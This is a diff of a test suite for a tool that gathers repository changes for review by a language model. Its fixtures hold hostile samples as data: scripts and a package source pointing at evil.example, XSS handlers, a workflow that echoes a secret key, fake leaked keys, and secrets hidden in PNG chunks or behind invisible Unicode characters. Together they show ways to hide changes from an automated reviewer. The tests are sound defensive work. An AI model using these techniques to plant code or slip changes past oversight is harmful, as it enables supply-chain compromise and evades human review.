@@ -5,15 +5,20 @@
    one fails here rather than in a review nobody reads. */
 import { describe, it, expect, beforeAll, afterAll } from "vitest";
 import { execFileSync } from "node:child_process";
-import { mkdtempSync, writeFileSync, mkdirSync, rmSync, readdirSync, readFileSync, existsSync } from "node:fs";
-import { join } from "node:path";
+import { mkdtempSync, writeFileSync, mkdirSync, rmSync, readdirSync, readFileSync, existsSync, symlinkSync } from "node:fs";
+import { join, relative } from "node:path";
 import { tmpdir } from "node:os";
+import { createHash } from "node:crypto";
+import { deflateSync } from "node:zlib";
 import {
   classifyPath, planContext, buildPrompt, validateResult, verdictFor, renderMarkdown, reportBaseName,
   FINDINGS_SCHEMA, MAX_FULL_FILE_CHARS, pageDigest, lockDigest, textDiff, parseNameStatusZ,
-  collectChanges, runReview,
+  collectChanges, runReview, exactText, reviewableImage, reviewText, fromReviewText,
 } from "../ops/astra-review.mjs";
+import { encodeCanonicalPng, canonicalDeflate, canonicalPng } from "../ops/png-canonical.mjs";
 
+/* A lockfile as npm writes it: 2-space JSON and a trailing newline. */
+const npmJson = (v) => JSON.stringify(v, null, 2) + "\n";
 const finding = (severity, extra = {}) => ({
   severity, file: "pulsern/src/x.js", line: 3, title: "t", problem: "p",
   failure_scenario: "f", fix: "fx", confidence: "high", ...extra,
@@ -30,7 +35,7 @@ beforeAll(() => {
   g("config", "user.email", "t@t"); g("config", "user.name", "t");
   write("pulsern/src/a.js", "export const a = 1;\n");
   write("pulsern/public/learn/bow-tie/index.html", "<html><head><title>Bow tie</title></head><body><p>Old guide text.</p></body></html>");
-  write("pulsern/package-lock.json", JSON.stringify({ packages: { "": {}, "node_modules/left-pad": { version: "1.0.0", resolved: "https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz", integrity: "sha512-AAAA" } } }));
+  write("pulsern/package-lock.json", npmJson({ packages: { "": {}, "node_modules/left-pad": { version: "1.0.0", resolved: "https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz", integrity: "sha512-AAAA" } } }));
   write("fullburn/x.js", "1\n");
   g("add", "-A"); g("commit", "-q", "-m", "base");
   g("tag", "base");
@@ -40,7 +45,7 @@ beforeAll(() => {
   write("pulsern/src/new\nline.js", "export const n = 1;\n");
   write("pulsern/public/learn/bow-tie/index.html", "<html><head><title>Bow tie</title><script src=\"https://evil.example/x.js\"></script></head><body><p>New guide text.</p></body></html>");
   write("pulsern/public/learn/sneaky/index.html", "<p>A page no generator writes</p>");
-  write("pulsern/package-lock.json", JSON.stringify({ packages: { "": {}, "node_modules/left-pad": { version: "1.0.0", resolved: "https://evil.example/left-pad-1.0.0.tgz", integrity: "sha512-BBBB" } } }));
+  write("pulsern/package-lock.json", npmJson({ packages: { "": {}, "node_modules/left-pad": { version: "1.0.0", resolved: "https://evil.example/left-pad-1.0.0.tgz", integrity: "sha512-BBBB" } } }));
   write("fullburn/x.js", "2\n");
   write("pulsern/reports/astra/old.md", "old report");
   g("add", "-A"); g("commit", "-q", "-m", "head");
@@ -55,10 +60,36 @@ describe("scope (no cross-contamination; nothing in PulseRN exempt)", () => {
     }
   });
 
-  it("never touches another project", () => {
-    for (const p of ["fullburn/engine/scripts/done.mjs", "haven/app/page.tsx", ".github/workflows/fullburn-gates.yml", ".github/workflows/cross-family-read.yml"]) {
+  it("never reads another project's code", () => {
+    for (const p of ["fullburn/engine/scripts/done.mjs", "haven/app/page.tsx", "package.json"]) {
       expect(classifyPath(p), p).toEqual({ mode: "skip", why: "outside PulseRN" });
     }
+  });
+  /* Round 13: any default-branch workflow can read the astra-review
+     environment's key, so a PulseRN review must not certify a change that
+     also alters the repository's control plane. */
+  it("refuses to certify a change to any other workflow or repository setting", () => {
+    for (const p of [".github/workflows/fullburn-gates.yml", ".github/workflows/bypass.yml", ".github/actions/x/action.yml", ".github/CODEOWNERS", ".github/dependabot.yml"]) {
+      expect(classifyPath(p).mode, p).toBe("refuse");
+    }
+  });
+  it("fails the review, end to end, when a differently named workflow rides along", async () => {
+    const dir = mkdtempSync(join(tmpdir(), "astra-cp-"));
+    const run = (...x) => execFileSync("git", x, { cwd: dir, encoding: "utf8" });
+    run("init", "-q"); run("config", "user.email", "t@t"); run("config", "user.name", "t");
+    mkdirSync(join(dir, "pulsern/docs"), { recursive: true });
+    writeFileSync(join(dir, "pulsern/docs/a.md"), "old\n"); run("add", "-A"); run("commit", "-qm", "b"); run("tag", "b");
+    writeFileSync(join(dir, "pulsern/docs/a.md"), "new\n");
+    mkdirSync(join(dir, ".github/workflows"), { recursive: true });
+    writeFileSync(join(dir, ".github/workflows/bypass.yml"), "on: push\njobs:\n  x:\n    environment: astra-review\n    runs-on: ubuntu-latest\n    steps: [{ run: echo $KEY }]\n");
+    run("add", "-A"); run("commit", "-qm", "h");
+    let called = false;
+    const { report, code } = await runReview({ base: "b", head: "HEAD", outDir: mkdtempSync(join(tmpdir(), "astra-out-")), rulesPath: "CLAUDE.md", cwd: dir }, { callModel: async () => { called = true; return { text: JSON.stringify({ assessment: "ok", findings: [] }), usage: {} }; } });
+    expect(called).toBe(false);
+    expect(report.verdict).toBe("FAIL");
+    expect(report.error).toMatch(/bypass\.yml/);
+    expect(code).not.toBe(0);
+    rmSync(dir, { recursive: true, force: true });
   });
 
   /* Astra finding #4: generated pages were exempt by path. They are now
@@ -74,8 +105,9 @@ describe("scope (no cross-contamination; nothing in PulseRN exempt)", () => {
     expect(classifyPath("pulsern/package-lock.json").mode).toBe("lockfile");
   });
 
-  it("skips only the reviewer's own past reports inside PulseRN", () => {
-    expect(classifyPath("pulsern/reports/astra/2026-10-08-x.md")).toEqual({ mode: "skip", why: "earlier review reports" });
+  it("exempts nothing inside PulseRN, past reports included", () => {
+    // round 17: nothing inside PulseRN is exempt by path
+    expect(classifyPath("pulsern/reports/astra/2026-10-08-x.md").mode).toBe("review");
   });
 
   it("keeps the generated-page list in step with what the generators write", () => {
@@ -112,10 +144,26 @@ describe("collecting from real git output (Astra finding #3)", () => {
     expect(accented.diff).toContain("hand-written, accented name");
   });
 
-  it("collects nothing from other projects and names the skipped report", () => {
+  it("collects nothing from other projects, and reviews a file under reports/astra like any other", () => {
     const { files, skipped } = collectChanges("base", "HEAD", { cwd: repo });
     expect(files.some((f) => f.path.startsWith("fullburn/"))).toBe(false);
-    expect(skipped).toEqual([{ path: "pulsern/reports/astra/old.md", why: "earlier review reports" }]);
+    expect(skipped).toEqual([]);
+    expect(files.find((f) => f.path === "pulsern/reports/astra/old.md").diff).toContain("old report");
+  });
+  it("never passes a change of only reports/astra files without asking the model (round 17)", async () => {
+    const dir = mkdtempSync(join(tmpdir(), "astra-rep-"));
+    const run = (...x) => execFileSync("git", x, { cwd: dir, encoding: "utf8" });
+    run("init", "-q"); run("config", "user.email", "t@t"); run("config", "user.name", "t");
+    writeFileSync(join(dir, "keep"), "x"); run("add", "-A"); run("commit", "-qm", "b"); run("tag", "b");
+    mkdirSync(join(dir, "pulsern/reports/astra"), { recursive: true });
+    writeFileSync(join(dir, "pulsern/reports/astra/debug.md"), "SUPABASE_SERVICE_ROLE_KEY=eyJ.leaked\n");
+    run("add", "-A"); run("commit", "-qm", "h");
+    let prompt = null;
+    const { report } = await runReview({ base: "b", head: "HEAD", outDir: mkdtempSync(join(tmpdir(), "astra-out-")), rulesPath: "CLAUDE.md", cwd: dir },
+      { callModel: async (a) => { prompt = a.prompt; return { text: JSON.stringify({ assessment: "x", findings: [] }), usage: {}, model: "m" }; } });
+    expect(prompt).toContain("SUPABASE_SERVICE_ROLE_KEY=eyJ.leaked");
+    expect(report.filesReviewed).toEqual(["pulsern/reports/astra/debug.md"]);
+    rmSync(dir, { recursive: true, force: true });
   });
 
   /* The bypass Astra described: a page dropped into a generated directory. */
@@ -130,33 +178,515 @@ describe("collecting from real git output (Astra finding #3)", () => {
     const { files } = collectChanges("base", "HEAD", { cwd: repo });
     const page = files.find((f) => f.path === "pulsern/public/learn/bow-tie/index.html");
     expect(page.form).toBe("page digest");
-    expect(page.diff).toMatch(/^\+SCRIPT src=https:\/\/evil\.example\/x\.js$/m);
-    expect(page.diff).toMatch(/^-TEXT Old guide text\.$/m);
-    expect(page.diff).toMatch(/^\+TEXT New guide text\.$/m);
+    expect(page.diff).toContain(`+TAG ${JSON.stringify('<script src="https://evil.example/x.js">')}`);
+    expect(page.diff).toContain(`-TEXT ${JSON.stringify("Old guide text.")}`);
+    expect(page.diff).toContain(`+TEXT ${JSON.stringify("New guide text.")}`);
   });
 
   it("shows a swapped download source in the lockfile summary", () => {
     const { files } = collectChanges("base", "HEAD", { cwd: repo });
     const lock = files.find((f) => f.path === "pulsern/package-lock.json");
     expect(lock.form).toBe("dependency summary");
-    expect(lock.diff).toMatch(/^\+left-pad@1\.0\.0 evil\.example /m);
+    expect(lock.diff).toMatch(/^\+"node_modules\/left-pad" .*"resolved":"https:\/\/evil\.example\/left-pad-1\.0\.0\.tgz"/m);
   });
 });
 
 describe("digests", () => {
   it("captures what a reader sees and what a browser runs", () => {
     const d = pageDigest(`<title>T</title><meta name="description" content="D"><script type="application/ld+json">{"a":1}</script><script>alert(1)</script><a href="/x" onclick="steal()">go</a><iframe src="https://x"></iframe><p>Body &amp; text</p>`);
-    expect(d).toContain("TITLE T");
-    expect(d).toContain('JSON-LD {"a":1}');
-    expect(d).toContain("SCRIPT inline alert(1)");
-    expect(d).toContain("HREF /x");
-    expect(d).toMatch(/HANDLER onclick="steal\(\)"/);
-    expect(d).toContain("EMBED <iframe");
-    expect(d).toContain("TEXT Body & text");
+    expect(d).toContain('TEXT "T"');
+    expect(d).toContain(`TAG ${JSON.stringify('<meta name="description" content="D">')}`);
+    expect(d).toContain('SCRIPT-BODY "{\\"a\\":1}"');
+    expect(d).toContain('SCRIPT-BODY "alert(1)"');
+    expect(d).toContain(`TAG ${JSON.stringify('<a href="/x" onclick="steal()">')}`);
+    expect(d).toContain(`TAG ${JSON.stringify('<iframe src="https://x">')}`);
+    expect(d).toContain('TEXT "Body &amp; text"');
   });
 
-  it("reports a lockfile it cannot read instead of passing it as empty", () => {
-    expect(lockDigest("{not json")).toBe("UNPARSEABLE package-lock.json\n");
+  /* PR #133 review, finding 2: an unquoted script source with an empty
+     body produced no digest change at all. */
+  it("shows an added script however it is written", () => {
+    const before = "<html><body><p>Hello</p></body></html>";
+    for (const tag of ["<script src=https://evil.example/p.js></script>", "<SCRIPT SRC='//evil.example/p.js'></SCRIPT>", "<img src=x onerror=alert(1)>", "<link rel=preload href=//evil.example/x.js as=script>"]) {
+      const after = before.replace("</body>", `${tag}</body>`);
+      const diff = textDiff(pageDigest(before), pageDigest(after), "page.html");
+      expect(diff, tag).not.toBe("");
+      expect(diff, tag).toContain(tag.includes("evil") ? "evil.example" : "onerror=alert(1)");
+    }
+  });
+
+  it("shows a changed attribute, a changed style and a changed comment", () => {
+    const base = '<div class="a" data-x=1><style>.a{color:red}</style><!-- note --></div>';
+    expect(textDiff(pageDigest(base), pageDigest(base.replace("data-x=1", "data-x=2")), "p")).not.toBe("");
+    expect(textDiff(pageDigest(base), pageDigest(base.replace("color:red", "background:url(//x)")), "p")).not.toBe("");
+    expect(textDiff(pageDigest(base), pageDigest(base.replace("note", "[if IE]><script src=x></script><![endif]")), "p")).not.toBe("");
+  });
+
+  /* PR #134 review, finding 3: whitespace inside code is behaviour. */
+  it("shows a newline that activates commented-out code", () => {
+    const a = "<script>// disabled alert(1)</script>", b = "<script>// disabled\nalert(1)</script>";
+    expect(textDiff(pageDigest(a), pageDigest(b), "p")).not.toBe("");
+  });
+  it("shows a whitespace change that alters automatic semicolon insertion", () => {
+    const a = "<script>return\n42</script>", b = "<script>return 42</script>";
+    expect(textDiff(pageDigest(a), pageDigest(b), "p")).not.toBe("");
+  });
+  it("keeps quoted attribute values exactly", () => {
+    const a = '<a onclick="x()// y\nz()">go</a>', b = '<a onclick="x()// y z()">go</a>';
+    expect(textDiff(pageDigest(a), pageDigest(b), "p")).not.toBe("");
+    expect(textDiff(pageDigest('<p title="a  b">x</p>'), pageDigest('<p title="a b">x</p>'), "p")).not.toBe("");
+  });
+  /* PR #134 review (round 3): replacements over the whole tag rewrote
+     quoted code, so "= =" and "==" digested the same. */
+  it("keeps every character of a quoted handler, including around =", () => {
+    const a = '<a onclick="if (1 = = 1) alert(1)">x</a>', b = '<a onclick="if (1 == 1) alert(1)">x</a>';
+    expect(pageDigest(a)).not.toBe(pageDigest(b));
+    expect(textDiff(pageDigest(a), pageDigest(b), "p")).not.toBe("");
+  });
+  it("shows that handler change end to end, through a real git change", () => {
+    const dir = mkdtempSync(join(tmpdir(), "astra-eq-"));
+    const run = (...a) => execFileSync("git", a, { cwd: dir, encoding: "utf8" });
+    run("init", "-q"); run("config", "user.email", "t@t"); run("config", "user.name", "t");
+    const page = "pulsern/public/learn/x/index.html";
+    mkdirSync(join(dir, "pulsern/public/learn/x"), { recursive: true });
+    writeFileSync(join(dir, page), '<p><a onclick="if (1 = = 1) alert(1)">x</a></p>');
+    run("add", "-A"); run("commit", "-qm", "base"); run("tag", "b");
+    writeFileSync(join(dir, page), '<p><a onclick="if (1 == 1) alert(1)">x</a></p>');
+    run("add", "-A"); run("commit", "-qm", "head");
+    const { files } = collectChanges("b", "HEAD", { cwd: dir });
+    const f = files.find((x) => x.path === page);
+    expect(f.form).toBe("page digest");
+    expect(f.diff).toContain("1 == 1");
+    rmSync(dir, { recursive: true, force: true });
+  }, 30000);   // creates real git repositories; slow under a full parallel run
+
+  /* Round 4: one space inside an UNQUOTED attribute moves its boundary —
+     "onerror=window.x =alert(1)" runs nothing, "...x=alert(1)" runs alert.
+     Tags are therefore kept byte-for-byte; only text is normalised. */
+  it("shows a one-space change inside a tag that moves an unquoted attribute boundary", () => {
+    const a = "<img src=x onerror=window.x =alert(1)>", b = "<img src=x onerror=window.x=alert(1)>";
+    expect(pageDigest(a)).not.toBe(pageDigest(b));
+    const dir = mkdtempSync(join(tmpdir(), "astra-ws-"));
+    const run = (...x) => execFileSync("git", x, { cwd: dir, encoding: "utf8" });
+    run("init", "-q"); run("config", "user.email", "t@t"); run("config", "user.name", "t");
+    const page = "pulsern/public/learn/y/index.html";
+    mkdirSync(join(dir, "pulsern/public/learn/y"), { recursive: true });
+    writeFileSync(join(dir, page), `<p>${a}</p>`); run("add", "-A"); run("commit", "-qm", "b"); run("tag", "b");
+    writeFileSync(join(dir, page), `<p>${b}</p>`); run("add", "-A"); run("commit", "-qm", "h");
+    const f = collectChanges("b", "HEAD", { cwd: dir }).files.find((x) => x.path === page);
+    expect(f.diff).toContain("window.x=alert(1)");
+    rmSync(dir, { recursive: true, force: true });
+  });
+  /* Round 5: nothing is normalised any more — a false "</scriptx>"
+     turned code into "text", and text whitespace was then collapsed. */
+  it("shows code activated behind a false </scriptx> close, end to end", () => {
+    const a = "<script>/* </scriptx> */ // disabled alert(1)</script>";
+    const b = "<script>/* </scriptx> */ // disabled\nalert(1)</script>";
+    expect(pageDigest(a)).not.toBe(pageDigest(b));
+    const dir = mkdtempSync(join(tmpdir(), "astra-sx-"));
+    const run = (...x) => execFileSync("git", x, { cwd: dir, encoding: "utf8" });
+    run("init", "-q"); run("config", "user.email", "t@t"); run("config", "user.name", "t");
+    const page = "pulsern/public/learn/z/index.html";
+    mkdirSync(join(dir, "pulsern/public/learn/z"), { recursive: true });
+    writeFileSync(join(dir, page), a); run("add", "-A"); run("commit", "-qm", "b"); run("tag", "b");
+    writeFileSync(join(dir, page), b); run("add", "-A"); run("commit", "-qm", "h");
+    const f = collectChanges("b", "HEAD", { cwd: dir }).files.find((x) => x.path === page);
+    expect(f.diff).toContain("disabled\\nalert(1)");
+    rmSync(dir, { recursive: true, force: true });
+  });
+  /* Round 7: git treated a source file with a NUL in a comment as binary,
+     and its diff became one "Binary files differ" line. */
+  it("shows every change in a source file git would call binary, even when too big to attach", () => {
+    const dir = mkdtempSync(join(tmpdir(), "astra-bin-"));
+    const run = (...x) => execFileSync("git", x, { cwd: dir, encoding: "utf8" });
+    run("init", "-q"); run("config", "user.email", "t@t"); run("config", "user.name", "t");
+    mkdirSync(join(dir, "pulsern/src"), { recursive: true });
+    const file = "pulsern/src/app.js";
+    const pad = "// " + "x".repeat(70_000) + "\n";
+    writeFileSync(join(dir, file), `/* \u0000 */\n${pad}export const dose = () => 1;\n`);
+    run("add", "-A"); run("commit", "-qm", "b"); run("tag", "b");
+    writeFileSync(join(dir, file), `/* \u0000 */\n${pad}export const dose = () => 1000;\n`);
+    run("add", "-A"); run("commit", "-qm", "h");
+    const f = collectChanges("b", "HEAD", { cwd: dir }).files.find((x) => x.path === file);
+    expect(f.form).toBe("diff");
+    expect(f.diff).not.toMatch(/Binary files/);
+    expect(f.diff).toContain("+export const dose = () => 1000;");
+    expect(f.diff).toContain("⟦U+0000⟧");
+    expect(f.full.length).toBeGreaterThan(MAX_FULL_FILE_CHARS);   // too big to attach: the diff alone must carry it
+    rmSync(dir, { recursive: true, force: true });
+  });
+  /* Rounds 8 and 9: what reaches the reviewer is decided by bytes, decoded
+     exactly, and shown one-to-one. (Characters are built with
+     String.fromCodePoint so this file itself holds no invisible ones.) */
+  describe("changes are judged by their bytes", () => {
+    const ch = (cp) => String.fromCodePoint(cp);
+    const CRC = Array.from({ length: 256 }, (_, n) => { let c = n; for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1; return c >>> 0; });
+    const crc = (b) => { let c = 0xffffffff; for (const x of b) c = CRC[(c ^ x) & 0xff] ^ (c >>> 8); return (c ^ 0xffffffff) >>> 0; };
+    const chunk = (type, data) => {
+      const len = Buffer.alloc(4); len.writeUInt32BE(data.length);
+      const body = Buffer.concat([Buffer.from(type, "latin1"), data]);
+      const sum = Buffer.alloc(4); sum.writeUInt32BE(crc(body));
+      return Buffer.concat([len, body, sum]);
+    };
+    const SIG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
+    const ihdrOf = (colour, depth = 8) => { const h = Buffer.alloc(13); h.writeUInt32BE(1, 0); h.writeUInt32BE(1, 4); h[8] = depth; h[9] = colour; return chunk("IHDR", h); };
+    /* A canonical 1x1 RGB PNG whose one pixel is (n, n, n). */
+    const PNG = (n) => encodeCanonicalPng({ width: 1, height: 1, colour: 2, pixels: Buffer.from([n, n, n]) });
+    /* The same pixels as an ordinary encoder writes them: decodable, valid,
+       but not canonical. */
+    const libPng = (n) => Buffer.concat([SIG, ihdrOf(2), chunk("IDAT", deflateSync(Buffer.from([0, n, n, n]))), chunk("IEND", Buffer.alloc(0))]);
+    /* A chunk inserted right after IHDR (8-byte signature + 25-byte IHDR). */
+    const afterIhdr = (png, type, data) => Buffer.concat([png.subarray(0, 33), chunk(type, data), png.subarray(33)]);
+    /* The same pixels with a chunk added just before IEND. */
+    const withChunk = (png, type, data) => Buffer.concat([png.subarray(0, png.length - 12), chunk(type, data), png.subarray(png.length - 12)]);
+    const secret = Buffer.from("Comment\0SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiJ9.service");
+    /* Valid zlib data with bytes after the end of the stream. */
+    const trailingIdat = (n) => {
+      const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(1, 0); ihdr.writeUInt32BE(1, 4); ihdr[8] = 8; ihdr[9] = 2;
+      const z = Buffer.concat([deflateSync(Buffer.from([0, n, n, n])), Buffer.from("patient: Jane Doe")]);
+      return Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), chunk("IHDR", ihdr), chunk("IDAT", z), chunk("IEND", Buffer.alloc(0))]);
+    };
+    function repoWith(changes) {
+      const dir = mkdtempSync(join(tmpdir(), "astra-bytes-"));
+      const run = (...x) => execFileSync("git", x, { cwd: dir, encoding: "utf8" });
+      run("init", "-q"); run("config", "user.email", "t@t"); run("config", "user.name", "t");
+      const put = (path, body) => {
+        const full = Buffer.concat([Buffer.from(dir + "/"), Buffer.isBuffer(path) ? path : Buffer.from(path)]);
+        mkdirSync(join(dir, String(path).split("/").slice(0, -1).join("/")), { recursive: true });
+        writeFileSync(full, body);
+      };
+      writeFileSync(join(dir, "keep"), "x");
+      for (const [path, a] of changes) if (a != null) put(path, a);
+      run("add", "-A"); run("commit", "-qm", "b"); run("tag", "b");
+      for (const [path, , b] of changes) put(path, b);
+      run("add", "-A"); run("commit", "-qm", "h");
+      return dir;
+    }
+    const ok = (findings = []) => ({ text: JSON.stringify({ assessment: "ok", findings }), usage: {}, model: "m" });
+
+    /* Through the production adapter, with only the HTTP boundary faked:
+       the request that leaves must carry both versions of the image. */
+    it("sends both versions of a changed image in the actual review request", async () => {
+      const path = "pulsern/public/diagram.png";
+      const dir = repoWith([[path, PNG(10), PNG(200)]]);
+      const sent = [];
+      const realFetch = globalThis.fetch, realKey = process.env.OPENROUTER_API_KEY;
+      process.env.OPENROUTER_API_KEY = "test-key";
+      globalThis.fetch = async (url, init) => {
+        sent.push(JSON.parse(init.body));
+        return { ok: true, status: 200, headers: { get: () => null }, json: async () => ({ model: "openai/gpt-6-luna", choices: [{ message: { content: JSON.stringify({ assessment: "ok", findings: [] }) } }], usage: { cost: 0 } }) };
+      };
+      try {
+        const outDir = mkdtempSync(join(tmpdir(), "astra-out-"));
+        const { report } = await runReview({ base: "b", head: "HEAD", outDir, rulesPath: "CLAUDE.md", cwd: dir });
+        expect(report.error, report.error).toBeNull();
+      } finally {
+        globalThis.fetch = realFetch;
+        if (realKey === undefined) delete process.env.OPENROUTER_API_KEY; else process.env.OPENROUTER_API_KEY = realKey;
+        rmSync(dir, { recursive: true, force: true });
+      }
+      expect(sent).toHaveLength(1);
+      const content = sent[0].messages[0].content;
+      expect(Array.isArray(content)).toBe(true);
+      const urls = content.filter((c) => c.type === "image_url").map((c) => c.image_url.url);
+      expect(urls).toEqual([`data:image/png;base64,${PNG(10).toString("base64")}`, `data:image/png;base64,${PNG(200).toString("base64")}`]);
+      const labels = content.filter((c) => c.type === "text").map((c) => c.text).join("\n");
+      expect(labels).toContain(createHash("sha256").update(PNG(200)).digest("hex"));
+      expect(content[0].text).toContain("(image)");
+    });
+
+    it("diffs text stored under an image name", () => {
+      const path = "pulsern/public/notes.png";
+      const dir = repoWith([[path, "dose: 1 mg\n", "dose: 10 mg\n"]]);
+      const f = collectChanges("b", "HEAD", { cwd: dir }).files.find((x) => x.path === path);
+      expect(f.form).toBe("diff");
+      expect(f.diff).toContain("+dose: 10 mg");
+      rmSync(dir, { recursive: true, force: true });
+    });
+
+    it("refuses what it cannot show, and never asks the model", async () => {
+      const html = Buffer.concat([PNG(1), Buffer.from("<script>fetch('/steal')</script>")]);
+      for (const [path, a, b] of [
+        ["pulsern/public/clip.mp3", Buffer.from([0xff, 0xfb, 0x90, 1, 2, 3]), Buffer.from([0xff, 0xfb, 0x90, 4, 5, 6])],
+        ["pulsern/public/guide.pdf", Buffer.from("%PDF-1.7\n\xe2\xe3\xcf\xd3 a", "latin1"), Buffer.from("%PDF-1.7\n\xe2\xe3\xcf\xd3 b", "latin1")],
+        ["pulsern/public/fake.png", Buffer.from([0x89, 0x50, 0, 1, 2]), Buffer.from([0x89, 0x50, 0, 9, 9, 9])],
+        // Astra's case: valid pixels with a script appended, saved as a page
+        ["pulsern/public/learn/example/index.html", null, html],
+        ["pulsern/src/widget.js", null, html],
+        // the same bytes under an image name: the extra bytes are refused too
+        ["pulsern/public/tail.png", PNG(1), html],
+        // a real PNG under another image name
+        ["pulsern/public/photo.jpg", PNG(1), PNG(2)],
+        // round 10: the pixels are identical, only metadata changed — a
+        // secret in a text chunk with a valid CRC, then the same in EXIF
+        ["pulsern/public/same.png", PNG(1), withChunk(PNG(1), "tEXt", secret)],
+        ["pulsern/public/exif.png", PNG(1), withChunk(PNG(1), "eXIf", secret)],
+        ["pulsern/public/private.png", PNG(1), withChunk(PNG(1), "prVt", secret)],
+        // bytes hidden after the end of the compressed image data
+        ["pulsern/public/idat.png", PNG(1), trailingIdat(1)],
+        // round 11, Astra's case: a "suggested palette" in an RGB PNG is
+        // never drawn, so a key padded to a palette length hides there
+        ["pulsern/public/plte.png", PNG(1), afterIhdr(PNG(1), "PLTE", Buffer.concat([secret, Buffer.alloc((3 - (secret.length % 3)) % 3)]))],
+        // the colour of a fully transparent pixel is never drawn either
+        ["pulsern/public/alpha.png", PNG(1), Buffer.concat([SIG, ihdrOf(6), chunk("IDAT", canonicalDeflate(Buffer.from([0, 0x4b, 0x45, 0x59, 0]))), chunk("IEND", Buffer.alloc(0))])],
+        // 16-bit samples: the low byte does not show on screen
+        ["pulsern/public/deep.png", PNG(1), Buffer.concat([SIG, ihdrOf(2, 16), chunk("IDAT", canonicalDeflate(Buffer.from([0, 1, 0x4b, 1, 0x45, 1, 0x59]))), chunk("IEND", Buffer.alloc(0))])],
+        // same pixels, ordinary encoder: compression choices can carry bits
+        ["pulsern/public/lib.png", PNG(1), libPng(2)],
+        // WebP is no longer accepted at all
+        ["pulsern/public/pic.webp", null, Buffer.concat([Buffer.from("RIFF"), Buffer.from([16, 0, 0, 0]), Buffer.from("WEBPVP8 "), Buffer.from([4, 0, 0, 0, 0x9d, 0x01, 0x2a, 0xff])])],
+      ]) {
+        const dir = repoWith([[path, a, b]]);
+        expect(() => collectChanges("b", "HEAD", { cwd: dir }), path).toThrow(/cannot pass/);
+        const outDir = mkdtempSync(join(tmpdir(), "astra-out-"));
+        let called = false;
+        const { code, report } = await runReview({ base: "b", head: "HEAD", outDir, rulesPath: "CLAUDE.md", cwd: dir }, { callModel: async () => { called = true; return ok(); } });
+        expect(called, path).toBe(false);
+        expect(report.verdict, path).toBe("FAIL");
+        expect(code, path).not.toBe(0);
+        rmSync(dir, { recursive: true, force: true });
+      }
+    }, 60000);
+
+    /* Round 8, Astra's case: a windows-1252 page whose script compares 0xE9
+       with 0xEA, changed to compare 0xE9 with 0xE9. */
+    it("refuses a page whose bytes are not valid UTF-8 instead of digesting replacement characters", () => {
+      const page = (x) => Buffer.concat([Buffer.from('<meta charset="windows-1252"><script>if ("'), Buffer.from([0xe9]), Buffer.from('" === "'), Buffer.from([x]), Buffer.from('") go()</script>')]);
+      const path = "pulsern/public/learn/z/index.html";
+      const dir = repoWith([[path, page(0xea), page(0xe9)]]);
+      expect(() => collectChanges("b", "HEAD", { cwd: dir })).toThrow(/learn\/z\/index\.html/);
+      rmSync(dir, { recursive: true, force: true });
+    });
+
+    /* Round 9: a name with an invalid byte was decoded lossily, the read of
+       that "other" path failed quietly, and the file reached review empty. */
+    it("refuses a changed path whose name is not valid UTF-8", () => {
+      const name = Buffer.concat([Buffer.from("pulsern/src/a"), Buffer.from([0xff]), Buffer.from(".js")]);
+      const dir = repoWith([[name, null, "export const dose = 1000;\n"]]);
+      expect(() => collectChanges("b", "HEAD", { cwd: dir })).toThrow(/path is not valid UTF-8/);
+      rmSync(dir, { recursive: true, force: true });
+    });
+
+    it("reads paths literally: a name with glob characters shows only its own change", () => {
+      const dir = repoWith([["pulsern/src/*.js", "a = 1;\n", "a = 2;\n"], ["pulsern/src/x.js", "x = 1;\n", "x = 2;\n"]]);
+      const files = collectChanges("b", "HEAD", { cwd: dir }).files;
+      const star = files.find((f) => f.path === "pulsern/src/*.js");
+      expect(star.diff).toContain("+a = 2;");
+      expect(star.diff).not.toContain("x = 2");
+      rmSync(dir, { recursive: true, force: true });
+    });
+
+    /* Round 9, Astra's case: a line comment ending in the six characters
+       \u{2028} keeps the call commented out; an actual U+2028 ends the
+       comment and the call runs. The two must not look the same. */
+    it("keeps a literal escape and the real character apart, end to end", () => {
+      const LS = ch(0x2028);
+      const before = "let r = 0; // note \\u{2028} r = 1;\nexport default r;\n";
+      const after = `let r = 0; // note ${LS} r = 1;\nexport default r;\n`;
+      const run = (src) => new Function(src.replace("export default r;", "return r;"))();
+      expect(run(before)).toBe(0);
+      expect(run(after)).toBe(1);
+      const path = "pulsern/src/flag.js";
+      const dir = repoWith([[path, before, after]]);
+      const f = collectChanges("b", "HEAD", { cwd: dir }).files.find((x) => x.path === path);
+      const minus = f.diff.split("\n").find((l) => l.startsWith("-let"));
+      const plus = f.diff.split("\n").find((l) => l.startsWith("+let"));
+      expect(minus.slice(1)).not.toBe(plus.slice(1));
+      expect(plus).toContain("⟦U+2028⟧");
+      expect(f.full).toContain("⟦U+2028⟧");
+      expect(f.full).not.toContain(LS);
+      rmSync(dir, { recursive: true, force: true });
+    });
+
+    it("encodes one-to-one: nothing typed in a file can pass for an invisible character", () => {
+      const samples = [
+        `${ch(0x2028)}`, "\\u{2028}", "⟦U+2028⟧", "⟦U+27E6⟧",
+        `${ch(0xfeff)}a${ch(0x202e)}b${ch(0x200b)}c${ch(0xe0041)}${ch(0)}${ch(13)}`,
+      ];
+      const shown = samples.map(reviewText);
+      expect(new Set(shown).size).toBe(samples.length);
+      for (const [i, s] of samples.entries()) expect(fromReviewText(shown[i])).toBe(s);
+      expect(reviewText(`${ch(0xfeff)}a${ch(0x202e)}b`)).toBe("⟦U+FEFF⟧a⟦U+202E⟧b");
+      // nothing invisible survives
+      expect(shown.join("")).not.toMatch(new RegExp(`[${ch(0x2028)}${ch(0xfeff)}${ch(0x202e)}${ch(0x200b)}${ch(0)}${ch(13)}]`));
+    });
+
+    it("decodes exactly: invalid bytes are rejected and a byte-order mark is kept", () => {
+      expect(exactText(Buffer.from([0x61, 0xe9]))).toBeUndefined();
+      expect(exactText(Buffer.from([0xef, 0xbb, 0xbf, 0x61]))).toBe(`${ch(0xfeff)}a`);
+      expect(exactText(null)).toBeNull();
+    });
+
+    /* Round 12: a page that is a symlink reached review as its target's
+       path, while the build would publish the target — here an unreviewed
+       file under the excluded reports directory. */
